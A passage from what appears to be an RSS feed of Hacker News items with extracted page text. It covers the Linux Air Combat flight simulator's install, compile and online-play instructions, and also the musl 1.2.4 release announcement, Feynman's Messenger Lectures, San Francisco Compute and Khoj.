example, the commands to install three of those prerequisite libraries,
issued into a bash command
shell, are:</small></small></big></big><br>
<big><big><small><small>
</small></small></big></big><br>
<big><big><small><small>
<span>sudo apt-get
install freeglut3-dev</span></small></small></big></big><br>
<big><big><small><small><span>sudo apt-get
install libsdl1.2-dev<br>
</span></small></small></big></big>
<big><big><small><small><span>sudo apt-get
install libsdl-mixer1.2-dev<br>
</span></small></small></big></big><big><big><small><small><span><br>
</span></small></small></big><big><small><small><span></span></small></small></big></big><big><big><small><small>For
those that want to compile LAC on Ubuntu desktop LINUX, we urge you to
use the "CodeBlocks" method as described in our "Ubuntu and LAC" forum
here: <p>

https://sourceforge.net/p/linuxaircombat/discussion/ubuntuandlac/</p></small></small></big></big><big><big><small><small><span><br>
</span></small></small></big></big><br>
</div>

<br>

<span></span>Experienced LINUX users will
recognize all of these as well-known LINUX
components. However, the exact names of these tools can vary among
different LINUX distributions, or even as distributions are updated.
You will need to adapt the names of the libraries listed above
according to the names in use on your LINUX variant. <p>



For most of the popular LINUX desktop distributions, every
one of these components will be freely available through the usual and
customary means, using free package managers. If you have a good
Internet connection, you should be able to get everything within 5 or
10 minutes and with just a few mouse clicks. For best compatibility
with other members of our online community, you will want to make sure
your libraries are up-to-date.&nbsp; <span>For
a YouTube video showing how we
obtained tools to compile a very similar project, </span><a href="https://www.youtube.com/watch?v=6Kroog87m8I" target="_top">CLICK
HERE.</a></p><p>



Compiling LAC should be easy. In our experience, it is NEVER necessary
to change even a single line of the source code. The real trick is
obtaining the correct prerequisite library files. (One source of
potential confusion derives from the fact that SDL libraries are
available in two distinct versions. We use the "classic" version 1.2.
Nowadays all of the major LINUX desktop distros provide SDL libraries
for both version 1.2 and for the newer version 2.0. LAC doesn't care if
you have both versions, but the current, production version of LAC
absolutely requires SDL version
1.2)&nbsp; <span>Furthermore, t</span></p><big><big><small><small>he
standard, well-known, free software library tools that LAC uses are
routinely updated from time to time. </small></small></big></big><big><big><small><small>If
you will be using our conventionally precompiled version on any
compatible type of desktop LINUX, you may experience odd errors unless
your LINUX is using the same version of the
required libraries. Further details about compiling LAC can be found in
FAQ #2 <a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacFaq.htm" target="_top">HERE</a>.</small></small></big></big><p>



<a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38StrafingB29.jpg"><img alt="Strafing a B29" src="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38StrafingB29.jpg"></a><br>

<span><a name="HardwareCompatibility"></a>Hardware
Compatibility</span></p><p>



LINUX AIR COMBAT hardware requirements are modest (it will even run
nicely on the smallest, least expensive version of the well-known,
extremely economical "Raspberry Pi Model
4b" and on the new "Raspberry Pi Model 400"). When using hardware that
was originally intended for use with
Microsoft "Windows", one
gigabyte of RAM
and an old Celeron or Pentium processor should suffice. Six levels of
graphic detail are available from a prominent configuration menu. When
configured to display in a small window with the simplest available
graphics, almost any desktop or
laptop PC built since about 2006 should be able to run it with
acceptable frame rates on any of the popular LINUX distributions.
Full-screen, high definition video using the
higher graphical levels (levels 4 and 5) will require an
accelerated
graphic card of the type made popular by nVidia, Intel, or ATi, but you
won't
need a really expensive card. We've had great success with cards that
cost U.S. $50.00 or less. </p><p>



In order to enjoy LAC's features to the fullest, try to tune its
graphic options so that it reports 60 Frames per second most of the
time. For the best, smoothest performance, we recommend a version of
LINUX using a lightweight desktop manager. LAC's demands are modest,
but if your desktop manager is heavily burdened before LAC is even
installed, there is nothing LAC can do to speed things up. When
everything is optimized, the silky smooth "feel" of LAC is amazing and
almost hypnotic!</p><p>



LINUX AIR COMBAT is intended for joystick flight controls. Joystick
axes, joystick buttons, and almost any keyboard key can be mapped to
any of 45
different flight functions and 23 comms functions, so you will be able
to set up your controls
to your liking. A joystick (like the popular, inexpensive Logitech
Extreme 3dPro) is HIGHLY recommended, but it is possible to control
LINUX AIR COMBAT with just a keyboard and mouse, or to use a "Console
Game Controller" connected via USB (wired or wireless).</p><p>



<span></span><br>

<span><a name="Downloading"></a>Downloading</span></p><p>

&nbsp;


New since 15Nov2019! Development is completed, and "production
releases" of LINUX AIR COMBAT can be downloaded for free public use.</p><p>



<span>Recent improvements
result in greater program stability, better support for players lacking
a joystick, improved visual perception of network jitter, better
support for laptop-style keyboards, easy access
to online documentation without exiting from LAC, more robust player
management, more robust handling of aircraft damage in flight,
penalties for online "fratricide", more realistic flight modeling, more
lethal guns and ordnance, additional multi-player missions, and more
powerful menu logic
allowing easy cycling of RedTeam/BlueTeam affiliation without exiting
from LAC, all while retaining
operational compatibility with all of the previous production missions
and releases.</span></p><p>



For those that DON'T want source code and have no interest in
compiling LAC, we now offer a binary version that has
been precompiled for (almost) universal compatibility with popular
desktop LINUX distros. <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">CLICK HERE</a> for related details.</p><p>



<a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/" target="_top">
</a><a target="_top" href="https://askmisterwizard.com/2019/LinuxAirCombat/Installers/index.htm">CLICK HERE</a> to go
to
our Installers
folder to download the latest, experimental versions. </p><p>



<a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/" target="_top">CLICK HERE</a>
for new information from our forums about a few official or
semi-official LINUX Repositories already supporting LAC for certain
desktop LINUX distros. If your distro has a Repository offering LAC,
you'll find this to be the easiest, simplest, best-supported
installation method.</p><p>



<a href="https://sourceforge.net/projects/linuxaircombat/files/" target="_top">CLICK HERE</a>&nbsp;
for the stable, compressed installation archive from our "SourceForge"
distribution
site. Check the
detailed, descriptive text carefully to make sure you select the most
appropriate
version for your needs. Every full, robust download version contains:</p><ul>

  <li>-- A compiled copy of Linux Air combat in the bin/Release
subfolder (this version was compiled for 64-bit PcLinuxOs. It may or
may not
work on
other LINUX distributions)<br>
  </li>
  <li>-- An installation script named "install.sh" that will install
and configure Linux Air Combat.</li>
  <li>-- All of the source code necessary to compile or customize your
own version of Linux Air Combat</li>
  <li>-- A "Codeblocks Project File" to make it easy to use the
free, well-known "Codeblocks" compiler GUI</li>
  <li>-- A "Makefile" for programmers that prefer to compile Linux Air
Combat without downloading or installing CodeBlocks</li>
  <li>-- One or more alternative Makefiles (in case our primary
Makefile doesn't work on your distro)<br>
  </li>
  <li>-- A set of additional subfolders containing all other necessary
resources</li>
</ul>

<span><span></span></span>After
downloading any of our distribution archives, you will find a new
"*.tar.gz" file in your designated download directory.<p>



Decompress the tar.gz file to produce
the associated
.tar file. Then de-archive
the tar file according to well-established LINUX norms. You can store
the resulting, new directory tree structure
anywhere you want it within your home filesystem (so long as you can
remember where you put it). Once you've de-archived the tar and
tar.gz archives, it's OK to delete them.<span><span><p>

Also
note that several
configuration files must be installed in specific filesystem locations
before the
compiled, executable program will run without errors. The first time
you execute LAC, it will attempt to store and access all of those files
appropriately.&nbsp; </p></span></span></p><p>



<span>
</span><span><span></span></span><span><a href="https://sourceforge.net/p/linuxaircombat/discussion/compilinglac/">CLICK
HERE</a>
to enter our "Compiling and Installing LAC" forum, where users publish
helpful instructions, comments, and video clips documenting their
successes.</span>
<span></span><span><span></span></span><span>Please
note that although a compiled,
executable copy of LINUX AIR COMBAT is included in your standard "Full
Kit" LAC
download, it
was compiled on a 64-bit PcLinuxOs system and may not work on other
distributions. Since most people are using different LINUX
versions,
most will need to
compile the source code to produce an appropriate executable version.
Unlike
other flight simulators, it is easy to compile LINUX AIR COMBAT, and
you can even do it all from within a friendly, graphical
environment without arcane text commands. Look for other, comprehensive
resources through numerous links on this page for detailed
instructions and video clips showing exactly how thousands of people
have done it.</span></p><p>



If you install LAC from one of our "Full Kit" install archives, within
the top-level de-archived folder, you should find an
executable
shell script named "install.sh", which automates the install process
the easy way. You are ready to run that shell script
after you compile the sourcecode&nbsp; or otherwise obtain the
appropriate executable version of LAC. </p><p>



Running that shell script from a
command window like /bin/bash will copy all of the required files into
the appropriate locations and configure the appropriate binary
executable program to run on your computer.&nbsp; <a href="http://askmisterwizard.com/2019/LinuxAirCombat/LAC%20Software%20Technology.htm" target="_top">CLICK HERE</a> for more background on downloading,
compiling, installing, and configuring LAC on a wide variety of LINUX
distros.<span></span></p><p>

&nbsp;


Also within that top-level de-archived folder, you should
find
full
source code and an associated ".cbp" file to configure the free,
well-known "CodeBlocks" Integrated Development Environment, making it
easy for you to compile and/or modify your own version of this
software. (Alternatively, if you don't want to use CodeBlocks, you can
use our "Makefile" to compile Linux Air Combat according to the usual
and customary norms. This method is not compatible with as many LINUX
systems as the "CodeBlocks" method due to minor differences among c++
compilers.)</p><p>



<span><a name="Compiling"></a>Compiling from
Source Code</span></p><p>



Linux Air Combat is FAR EASIER to compile and modify than any
comparable flight simulator. The source code
is exceptionally well organized for easy compilation on almost any PC
running a desktop version of Linux. </p><p>



<a target="_self" href="https://askmisterwizard.com/2019/LinuxAirCombat/Compiling/CompilingLacPage01Body.htm">CLICK HERE</a>
for our
easy, detailed compilation
instructions and video examples for beginners.<br>

<a href="https://askmisterwizard.com/2019/LinuxAirCombat/LAC%20Software%20Technology.htm" target="_self">CLICK HERE</a> for additional compiling resources.</p><big><big><small><small><big><span>Online Play and the Linux Air Combat
Community</span><p>

<span>The community of
flight simulator fanatics is small among desktop LINUX Users. At the
time of
this writing, only a few people know about
Linux Air Combat's new online server. We generally gather online on
Thursday evenings, from about 6PM until 8:00 or 9:00 PM Central USA
time, but the server is up constantly, and you might find players
anytime. Please help us pass the word.
Invite your friends to join you online as we build up this community
from its tiny state. At first, everybody will have trouble finding
others with whom we can fly. This will only succeed if we all bring
friends into the emerging new "LAC Community". Recent online activity
and improvements have focused on "Network Battle 02", "Network Battle
03"&nbsp; and on "Peabody's Mission" in Realm "1". You are more likely
to find other players in those missions than in
any of the others, and they are usually populated by a new set of
"Replay Blokes" from "Server Missions" even when no other human players
are active.&nbsp; If you are the only online
player in most of the other online missions, LAC will populate the
mission with "bot"
players (generated on your own computer) to serve as your allies and as
your opposition. Although those bots aren't very smart,&nbsp; you can
use them for target practice and to hone your tactical skills until
some more online players join your mission.</span></p></big><br>
<big><big><br>
<iframe src="https://www.youtube.com/embed/44K7BC1t-bg" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="270" width="480"></iframe>
<br>
<small><span><small>How to enjoy LAC's
online missions when you are the only online human player.</small><br>
</span></small>
<a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38LandedChaseView.jpg"><img alt="Ready for takeoff" src="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38LandedChaseView.jpg"></a><br>
</big></big></small></small></big></big><big><big><small><small><big><big><small><small><span>Lockheed P38L
"Lightning" ready for Takeoff!</span></small></small>
</big></big></small></small></big></big><a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38LandedChaseView.jpg"><span></span></a><a href="https://askmisterwizard.com/2019/LinuxAirCombat/F4uSelected01.jpg"><img alt="F4u Corsair selected for flight" src="https://askmisterwizard.com/2019/LinuxAirCombat/F4uSelected00.jpg"></a><big><big><small><small><big><big><br>
<small><small><span></span><span>Aircraft selection is done from a
prominent menu. Each option summarizes the attributes of one of LAC's
flyable planes.</span><br>
</small></small><br>
<span><a name="VoiceComms"></a>Voice
Communication with other LAC
players </span></big></big><big>For your convenience communicating with others in the LAC
Community,
AskMisterWizard.com sponsors a Mumble server, so you will </big></small></small></big>benefit
greatly from the free, well-known "<span>Mumble</span>"
Internet voice client application. Good Mumble clients are available
for many
popular operating systems including LINUX, Apple/IOS, Android, MacOS,
and
Windows. Install it on your PC, Macintosh, Windows machine, phone, or
tablet. Use Mumble to find other online players, to arrange online
missions with them, to communicate with other LAC users during flight,
or just to chat about LAC with other users or developers. Because LAC
is new and the server is now supporting only a small community of
users, you will naturally want to know if anybody else is flying, and
the realms and missions in use. Our Mumble Server serves as your "home
base" for these activities. You and your
friends can connect to our Mumble
server at <span>LinuxAirCombat.com</span>
at any time.
Configure your Mumble server connection with a simple username that is
unique to yourself. We use Mumble's standard Public Key Infrastructure
to authenticate users the easy way, so you won't need a
password. Our server has dedicated channels for general discussion of
LAC, for technical support, and for each of our online missions and
their teams. <p>

Furthermore, if you install Mumble on the same LINUX machine hosting
LAC, you get some additional benefit: LAC will fully integrate your
local copy of Mumble into
your LAC keyboard controls and cockpit, and it will automatically
switch Mumble into the best of our channels for your selected mission
and team! (When flying LAC's online missions, you
will have best success if you are using Mumble version 1.30 or later.
However, LAC can be configured to interface almost as well with older
versions of Mumble too. LAC just needs to be told whether your Mumble
version is "old-style" or "new-style". Configure this by editing the
"NetworkMode" field of the "LacConfig.txt" file that you will find in
your new, hidden ~/home/.LAC folder, as guided by the helpful text it
contains.)</p><p>

You can find help on this and other topics in our "Beginner Topics"
forum <a href="https://sourceforge.net/p/linuxaircombat/discussion/beginnertopics/" target="_top">HERE</a>. Pay particular attention to the posting about
"Editing LAC's Configuration File".</p><big><span>Upgrades</span></big><p>

The standard, downloadable LAC distribution is tuned for a typical
LINUX desktop PC. If your PC is more powerful than the average, you can
download enhanced graphic models of the airstrip and aircraft for
improved visual appearance. On the other hand, if your PC is less
powerful, you can download simplified graphic models to help increase
your framerate for smoother flight. Either way, you will want to <a href="https://askmisterwizard.com/2019/LinuxAirCombat/Enhancements/LacEnhancements.htm" target="_top">CLICK HERE</a>
to learn about the options.</p><big><big><small><small>
</small></small></big></big></big><br>

<big><big><span><a name="HowTo"></a>
New! The Linux Air Combat Video HowTo!</span></big></big><p>



We are building a comprehensive series of short, highly focused YouTube
video clips to help you download, install, configure, and enjoy Linux
Air Combat. Most of these
video clips are less than 5 minutes in length, and many are less than
two minutes long, because each covers just a single topic. Organized as
a YouTube "playlist", you can quickly scan the many separate titles to
focus in on a specific problem or area of interest. We are adding
titles to this playlist frequently, so if you don't see what you need
right now you might find it later. Please use YouTube comments
associated with each clip to ask or answer related questions for the
LAC community. This advertising-supported effort helps to fund our
development, so we appreciate your participation and support. </p><p>



<a target="_top" href="https://www.youtube.com/playlist?list=PL1IYes9MY6lL95GbWC60qKKEbhqB4oyKL">CLICK
HERE</a> to go directly to the Linux Air Combat
Video HowTo on YouTube</p><big><big><span>Frequently Asked Questions</span></big></big><p>



<a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacFaq.htm" target="_top">CLICK HERE</a> to go directly to
the Linux Air Combat FAQ page</p><big><big><span>Forums</span></big></big><p>



<a href="https://sourceforge.net/p/linuxaircombat/discussion/" target="_top">CLICK HERE</a>
to go directly to the Linux Air Combat Forums, where you can ask
questions and read a great many tips and links to additional resources.</p><big><span>Screen shots from recent missions:</span></big><p>



<a href="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38/DesertTerrain/Lac08p59DesertVsF4u17Feb2021l.jpg"><img alt="" src="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38/DesertTerrain/Lac08p59DesertVsF4u17Feb2021l.jpg"></a><br>

<span>Low-level air-to-air combat in the
desert terrain. The target, heavily damaged and trailing thick clouds
of black smoke, is desparately trying to flee from the stream of
machine-gun bullets emerging from the player's guns. The player has
configured LAC to display Mumble's application frame to the right of
the main display window. </span><a href="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38/IslandTerrain/Lac08p58VsP38OverIslands03.jpg"><img alt="" src="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38/IslandTerrain/Lac08p58VsP38OverIslands03.jpg"></a>&nbsp;
<br>

<span>Low-level combat versus a Lockheed
P38 "Lightning" in an island mission. This player has configured LAC
for full-screen view, so Mumble's application frame cannot be seen.
This player relies on LAC's sophisticated "Mumble Panel" to inform him
of channels in use, transmission and reception activity, and the names
of any players that are speaking.<p>


<a href="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38External/vlcsnap-2022-09-13-08h45m32s657.png"><img alt="Head-on view of Lockheed P38 Lightning." src="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38External/vlcsnap-2022-09-13-08h45m32s657.png"></a></p></span>
<a href="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38External/vlcsnap-2022-09-13-08h44m58s453.png"><img alt="Another external view of P38." src="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38External/vlcsnap-2022-09-13-08h44m58s453.png"></a>.<br>

External, "head-on" views of Lockheed's P38 "Lightning".</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: San Francisco Compute – 512 H100s at <$2/hr for research and startups (567 pts)]]></title>
            <link>https://sfcompute.org/</link>
            <guid>36933603</guid>
            <pubDate>Sun, 30 Jul 2023 17:25:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sfcompute.org/">https://sfcompute.org/</a>, See on <a href="https://news.ycombinator.com/item?id=36933603">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p><i>By Alex Gajewski and Evan Conrad</i></p>
            <p>(we previously ran <a href="https://aigrant.org/">AI
                    Grant</a> together)
            </p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Khoj – Chat Offline with Your Second Brain Using Llama 2 (376 pts)]]></title>
            <link>https://github.com/khoj-ai/khoj</link>
            <guid>36933452</guid>
            <pubDate>Sun, 30 Jul 2023 17:14:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/khoj-ai/khoj">https://github.com/khoj-ai/khoj</a>, See on <a href="https://news.ycombinator.com/item?id=36933452">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto">
<hr>
<p dir="auto">Khoj is a desktop application to search and chat with your notes, documents and images.<br>
It is an offline-first, open source AI personal assistant accessible from your Emacs, Obsidian or Web browser.<br>
It works with jpeg, markdown, notion, org-mode, pdf files and github repositories.<br></p>
<hr>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Richard Feynman's 1964 Messenger Lectures at Cornell University (218 pts)]]></title>
            <link>https://www.feynmanlectures.caltech.edu/messenger.html</link>
            <guid>36933209</guid>
            <pubDate>Sun, 30 Jul 2023 16:55:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.feynmanlectures.caltech.edu/messenger.html">https://www.feynmanlectures.caltech.edu/messenger.html</a>, See on <a href="https://news.ycombinator.com/item?id=36933209">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="Messenger-S1">
<h3>About Feynman's Messenger Lectures</h3>

<p>
In 1963 Richard Feynman was invited to give the 1964 Messenger Lectures at Cornell University, an annual tradition since 1924, when Hiram Messenger gifted Cornell with "a fund to provide a course of lectures on the Evolution of Civilization for the special purpose of raising the moral standard of our political, business, and social life", to be "delivered by the ablest non-resident lecturer or lecturers obtainable".</p>

<p>
Feynman had been a physics professor at Cornell from 1945 to 1950, during which time he did the work for which he was awarded a Nobel Prize in 1965. While at Cornell Feynman became well-known in the physics community for his innovations in quantum electrodynamics and idosyncratic style. He was at Caltech in 1963, when he was invited to become the 41st Messenger Lecturer<a id="footnote_source_1" href="#footnote_1"><sup>1</sup></a>, by which time he had become known to a much wider audience through his recently published book, Volume I of <i>The Feynman Lectures on Physics.</i><a id="footnote_source_2" href="#footnote_2"><sup>2</sup></a></p>

<p>
 According to the Cornell Faculty Website, "A Messenger Lecturer typically gives three lectures/presentations over the course of a one-week visit. At least one of these must be a lecture that is suitable for a general audience."<a id="footnote_source_3" href="#footnote_3"><sup>3</sup></a> Feynman, however, chose to give a series of <i>six</i> lectures, <i>all</i> for a general audience, which he titled <i>The Character of Physical Law</i>.<a id="footnote_source_4" href="#footnote_4"><sup>4</sup></a> He had plenty of material to draw from his recently completed introductory physics course, the basis of <i>The Feynman Lectures on Physics</i>. For this reason one finds many similarities, parallels, and even identical parts in the lectures of <i>The Character of Physical Law</i> and several of the lectures in <i>The Feynman Lectures on Physics</i>.</p>
 
 <p>
Feynman's Messenger Lectures were videotaped by the BBC, who in 1965 published a hardbound book of edited lecture transcripts under the title, <i>The Character of Physical Law</i>. In 1967 the paperback rights were licensed to MIT Press who continues to print the book today.<a id="footnote_source_5" href="#footnote_5"><sup>5</sup></a> The videotapes were transferred to film, and in the late 1960s through the '70s copies of the films were in wide distribution at colleges and universities.<a id="footnote_source_6" href="#footnote_6"><sup>6</sup></a> Sadly, however, these wonderful films of Feynman lecturing at the peak of his prowess went out of distribution and became generally unavailable in the 1980s.</p>

<p>
In 2009, when Microsoft Research introduced their Silverlight framework for media-rich web applications, Bill Gates licensed rights to stream the BBC's films of Feynman’s Messenger Lectures online. Hoping to encourage others to make educational content available for free, he used them in the first Silverlight demo, “Project Tuva.”<a id="footnote_source_7" href="#footnote_7"><sup>7</sup></a> The publication of Feynman’s Messenger Lectures for free online viewing, with special features such as searchable synchronized scrolling transcripts, links to related online material, and  commentary, was an instant hit with Feynman fans, students and physicists. The Silverlight framework, however, was not widely adopted, and in 2016 Project Tuva was retired. The videos were still available for viewing on the Microsoft Research Website (though without the special features) until 2021, when their BBC license expired. The license has since been generously renewed by Bill Gates so that the videos can continue to be shown online to users of The Feynman Lectures Website.</p>
</div><div id="Messenger-S2">
<h3>The Feynman Messenger Lectures Video Viewer</h3>

<p>
Clicking on a lecture title above will open <i>The Feynman Messenger Lectures Video Viewer,</i> an application based on the Microsoft Azure Media Player for displaying the films of Feynman's lecture series <i>The Character of Physical Law</i> in high definition video<a id="footnote_source_8" href="#footnote_8"><sup>8</sup></a> with a searchable interactive auto-scrolling transcript. The Viewer allows one to resize the video/transcript areas (even during play), and has a simple tabbed user interface. For detailed instructions on using the Viewer please refer to its "Help" tab after opening the application with the links above.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Musl 1.2.4 adds TCP DNS fallback (205 pts)]]></title>
            <link>https://www.openwall.com/lists/musl/2023/05/02/1</link>
            <guid>36933028</guid>
            <pubDate>Sun, 30 Jul 2023 16:39:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.openwall.com/lists/musl/2023/05/02/1">https://www.openwall.com/lists/musl/2023/05/02/1</a>, See on <a href="https://news.ycombinator.com/item?id=36933028">Hacker News</a></p>
<div id="readability-page-1" class="page">


<table>
<tbody><tr>

<td>
<a href="https://www.openwall.com/"><img src="https://www.openwall.com/logo.png" width="182" height="80" alt="Openwall"></a>
</td><td>
<div>
<ul>
<li><a href="https://www.openwall.com/">Products</a>
<ul>
<li><a href="https://www.openwall.com/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
</li><li><a href="https://www.openwall.com/lkrg/">Linux Kernel Runtime Guard</a>
</li><li><a href="https://www.openwall.com/john/">John the Ripper &nbsp; <i>password cracker</i></a>
<ul>
<li><a href="https://www.openwall.com/john/">Free &amp; Open Source for any platform</a>
</li><li><a href="https://www.openwall.com/john/cloud/">in the cloud</a>
</li><li><a href="https://www.openwall.com/john/pro/linux/">Pro for Linux</a>
</li><li><a href="https://www.openwall.com/john/pro/macosx/">Pro for macOS</a>
</li></ul>
</li><li><a href="https://www.openwall.com/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
</li><li><a href="https://www.openwall.com/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
<ul>
<li><a href="https://www.openwall.com/passwdqc/">Free &amp; Open Source for Unix</a>
</li><li><a href="https://www.openwall.com/passwdqc/windows/">Pro for Windows (Active Directory)</a>
</li></ul>
</li><li><a href="https://www.openwall.com/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
</li><li><a href="https://www.openwall.com/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
</li><li><a href="https://www.openwall.com/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
</li><li><a href="https://www.openwall.com/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
</li><li><a href="https://www.openwall.com/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
</li><li><a href="https://www.openwall.com/pam/">Pluggable Authentication Modules</a>
</li><li><a href="https://www.openwall.com/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
</li><li><a href="https://www.openwall.com/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
</li><li><a href="https://www.openwall.com/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
</li><li><a href="https://www.openwall.com/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
</li><li><a href="https://www.openwall.com/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
</li></ul>
</li><li><a href="https://www.openwall.com/services/">Services</a>
</li><li id="narrow-li-1"><a>Publications</a>
<ul>
<li><a href="https://www.openwall.com/articles/">Articles</a>
</li><li><a href="https://www.openwall.com/presentations/">Presentations</a>
</li></ul>
</li><li><a>Resources</a>
<ul>
<li><a href="https://www.openwall.com/lists/">Mailing lists</a>
</li><li><a href="https://openwall.info/wiki/">Community wiki</a>
</li><li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
</li><li><a href="https://cvsweb.openwall.com/">Source code repositories (CVSweb)</a>
</li><li><a href="https://www.openwall.com/mirrors/">File archive &amp; mirrors</a>
</li><li><a href="https://www.openwall.com/signatures/">How to verify digital signatures</a>
</li><li><a href="https://www.openwall.com/ove/">OVE IDs</a>
</li></ul>
</li><li id="last-li"><a href="https://www.openwall.com/news">What's new</a>
</li></ul>
</div>


</td></tr></tbody></table>




<a href="https://www.openwall.com/lists/musl/2023/05/01/3">[&lt;prev]</a> <a href="https://www.openwall.com/lists/musl/2023/05/02/2">[next&gt;]</a> <a href="https://www.openwall.com/lists/musl/2023/05/02/">[day]</a> <a href="https://www.openwall.com/lists/musl/2023/05/">[month]</a> <a href="https://www.openwall.com/lists/musl/2023/">[year]</a> <a href="https://www.openwall.com/lists/musl/">[list]</a>
<pre>Date: Mon, 1 May 2023 23:47:32 -0400
From: Rich Felker &lt;dalias@...c.org&gt;
To: musl@...ts.openwall.com
Subject: musl 1.2.4 released

This release adds TCP fallback to the DNS stub resolver, fixing the
longstanding inability to query large DNS records and incompatibility
with recursive nameservers that don't give partial results in
truncated UDP responses. It also makes a number of other bug fixes and
improvements in DNS and related functionality, including making both
the modern and legacy API results differentiate between NODATA and
NxDomain conditions so that the caller can handle them differently.

On the API level, the legacy "LFS64" ("large file support")
interfaces, which were provided by macros remapping them to their
standard names (#define stat64 stat and similar) have been deprecated
and are no longer provided under the _GNU_SOURCE feature profile, only
under explicit _LARGEFILE64_SOURCE. The latter will also be removed in
a future version. Builds broken by this change can be fixed short-term
by adding -D_LARGEFILE64_SOURCE to CFLAGS, but should be fixed to use
the standard interfaces.

The dynamic linker (and static-PIE entry point code) adds support for
the new compact "RELR" format for relative relocations which recent
linkers can generate. Use of this linker feature for dynamic-linked
programs will make them depend on having musl 1.2.4 or later available
at runtime. Static-linkied PIE binaries using it, as always, are
self-contained and have no such dependency.

A large number of bugs have been fixed, including many in the wide
printf family of functions, incorrect ordering of digits vs non-digits
in strverscmp, and several rare race-condition corner cases in thread
synchronization logic at thread exit time, in multi-threaded fork,
pthread_detach, and POSIX semaphores.


<a href="https://musl.libc.org/releases/musl-1.2.4.tar.gz" rel="nofollow">https://musl.libc.org/releases/musl-1.2.4.tar.gz</a>
<a href="https://musl.libc.org/releases/musl-1.2.4.tar.gz.asc" rel="nofollow">https://musl.libc.org/releases/musl-1.2.4.tar.gz.asc</a>



Special thanks goes out to musl's release sponsors for supporting the
project financially via Patreon and GitHub Sponsors at the $32/month
level or higher:

* Andrew Kelley / ziglang
* Danny McClanahan
* enduser
* Eric Pruitt
* Evan Phoenix
* Greg Krimer
* Hurricane Labs
* Justin Cormack
* Kentik
* Laurent Bercot
* Michael Sartain
* Mirza Prasovic
* Moinak Bhattacharyya
* Nabu Casa
* Nathan Hoad
* Neal Gompa
* Stackhero
* Tyler James Frederick

For information on becoming a sponsor, visit one of:

<a href="https://github.com/sponsors/richfelker" rel="nofollow">https://github.com/sponsors/richfelker</a>
<a href="https://patreon.com/musl" rel="nofollow">https://patreon.com/musl</a>
</pre>
<p><a href="http://www.openwall.com/blists/">Powered by blists</a> - <a href="http://lists.openwall.net/">more mailing lists</a>


</p><p>
Confused about <a href="https://www.openwall.com/lists/">mailing lists</a> and their use?
<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
and check out these
<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Repeating Yourself Thrice Doesn’t Turn You into a 3x Developer (112 pts)]]></title>
            <link>https://yrashk.medium.com/repeating-yourself-thrice-doesnt-turn-you-into-a-3x-developer-a778495229c0</link>
            <guid>36932876</guid>
            <pubDate>Sun, 30 Jul 2023 16:24:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://yrashk.medium.com/repeating-yourself-thrice-doesnt-turn-you-into-a-3x-developer-a778495229c0">https://yrashk.medium.com/repeating-yourself-thrice-doesnt-turn-you-into-a-3x-developer-a778495229c0</a>, See on <a href="https://news.ycombinator.com/item?id=36932876">Hacker News</a></p>
